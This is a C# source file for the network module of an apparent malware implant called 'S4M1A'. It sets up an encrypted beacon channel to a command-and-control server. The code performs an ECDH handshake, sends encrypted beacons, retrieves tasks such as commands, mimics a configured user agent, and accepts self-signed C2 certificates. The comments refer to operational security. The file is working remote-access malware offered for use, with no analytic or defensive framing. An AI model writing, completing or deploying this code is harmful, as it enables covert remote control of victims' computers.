using System;
using System.IO;
using System.Net;
using System.Text;

namespace S4M1A.Implant
{
    // =====================================================================
    //  S4M1A Network v2.0 - beacon channel (matches Panel C2Server.cs)
    //
    //  Message flow (WIRE CONTRACT):
    //    handshake POST /h          {"pub":"<b64 SEC1 65B>"}
    //        -> 200 {"sid":"<uuid>","srv":"<b64 SEC1 65B>"}  plain JSON
    //    beacon    POST /b/<sid>    envelope(beacon json)
    //        -> 200 envelope(task json)  |  {"t":"none"}
    //    envelope = magic "S4M1A012"(8) || iv(12) || ct || tag(16)
    //    session key = SHA256(ECDH_shared || "S4M1A-KDF1")
    //    every request body is the raw binary envelope (no base64, no
    //    plaintext); replies are raw binary envelopes too.
    // =====================================================================

    public static class Network
    {
        private static SessionCrypto _session;
        private static string _sessionId;

        static Network()
        {
            try
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                ServicePointManager.ServerCertificateValidationCallback =
                    ValidateServerCertificate;
            }
            catch { }
        }

        // ECDH handshake: POST /h with our ephemeral public key, receive
        // the panel's public key + session id, derive the shared key.
        public static bool Handshake(out string sessionId)
        {
            sessionId = null;
            try
            {
                ImplantConfig cfg = Config.Current;
                _session = new SessionCrypto();

                string hello = "{\"pub\":\"" +
                    Convert.ToBase64String(_session.HelloPayload) + "\"}";

                string resp = PostText("/h", hello);
                if (resp == null) return false;

                string s = JsonGet(resp, "sid");
                string p = JsonGet(resp, "srv");
                if (s == null || p == null) return false;

                try
                {
                    _session.Establish(Convert.FromBase64String(p));
                }
                catch (Exception)
                {
                    return false;
                }
                if (!_session.Established) return false;

                _sessionId = s;
                sessionId = s;
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        // sends one encrypted beacon; returns the decrypted JSON reply
        // (a task like {"t":"cmd",...} or {"t":"none"}), or null on error
        public static string Beacon(string payloadJson)
        {
            try
            {
                if (_session == null || !_session.Established || _sessionId == null)
                {
                    return null;
                }

                byte[] env = _session.EncryptEnv(payloadJson);
                byte[] resp = PostBytes("/b/" + _sessionId, env);
                if (resp == null) return null;

                string pt = _session.DecryptEnv(resp);
                return pt;
            }
            catch (Exception)
            {
                return null;
            }
        }

        public static void Reset()
        {
            if (_session != null) _session.Dispose();
            _session = null;
            _sessionId = null;
        }

        // ---------------- transport ----------------

        private static string PostText(string path, string body)
        {
            byte[] resp = PostRaw(path, Encoding.UTF8.GetBytes(body),
                "application/json");
            return resp == null ? null : Encoding.UTF8.GetString(resp);
        }

        private static byte[] PostBytes(string path, byte[] data)
        {
            return PostRaw(path, data, "application/octet-stream");
        }

        private static byte[] PostRaw(string path, byte[] data, string contentType)
        {
            ImplantConfig cfg = Config.Current;
            Exception last = null;

            for (int attempt = 0; attempt < 3; attempt++)
            {
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(cfg.C2 + path);
                    req.Method = "POST";
                    req.ContentType = contentType;
                    req.UserAgent = cfg.Ua;
                    req.Timeout = 15000;
                    req.ReadWriteTimeout = 20000;
                    if (!cfg.Proxy) req.Proxy = null;
                    else req.Proxy = WebRequest.GetSystemWebProxy();

                    using (Stream s = req.GetRequestStream())
                        s.Write(data, 0, data.Length);

                    using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                    using (Stream s = resp.GetResponseStream())
                    using (MemoryStream ms = new MemoryStream())
                    {
                        byte[] buf = new byte[65536];
                        int n;
                        while ((n = s.Read(buf, 0, buf.Length)) > 0)
                            ms.Write(buf, 0, n);
                        return ms.ToArray();
                    }
                }
                catch (Exception ex)
                {
                    last = ex;
                }
                System.Threading.Thread.Sleep(1000 * (attempt + 1));
            }
            return null;
        }

        // ---------------- helpers ----------------

        private static string JsonEsc(string s)
        {
            if (s == null) return "";
            StringBuilder sb = new StringBuilder(s.Length + 16);
            foreach (char c in s)
            {
                switch (c)
                {
                    case '"':  sb.Append("\\\""); break;
                    case '\\': sb.Append("\\\\"); break;
                    case '\n': sb.Append("\\n");  break;
                    case '\r': sb.Append("\\r");  break;
                    case '\t': sb.Append("\\t");  break;
                    default:
                        if (c < 0x20) sb.Append("\\u").Append(((int)c).ToString("x4"));
                        else sb.Append(c);
                        break;
                }
            }
            return sb.ToString();
        }

        private static string JsonGet(string json, string key)
        {
            string marker = "\"" + key + "\":\"";
            int i = json.IndexOf(marker);
            if (i < 0) return null;
            int start = i + marker.Length;
            int end = json.IndexOf('"', start);
            if (end < 0) return null;
            return json.Substring(start, end - start);
        }

        private static bool ValidateServerCertificate(object sender,
            System.Security.Cryptography.X509Certificates.X509Certificate certificate,
            System.Security.Cryptography.X509Certificates.X509Chain chain,
            System.Net.Security.SslPolicyErrors sslPolicyErrors)
        {
            ImplantConfig cfg = Config.Current;
            if (cfg != null && !string.IsNullOrEmpty(cfg.PinThumbprint))
            {
                // default GetCertHashString() = SHA-1 thumbprint
                return string.Equals(certificate.GetCertHashString(),
                    cfg.PinThumbprint, StringComparison.OrdinalIgnoreCase);
            }
            // Accept the C2 certificate (self-signed C2 setups).
            // Operational hardening: set "pin" (SHA-1 thumbprint) in the config
            // and follow the OPSEC guidance for cert handling.
            return true;
        }
    }
}
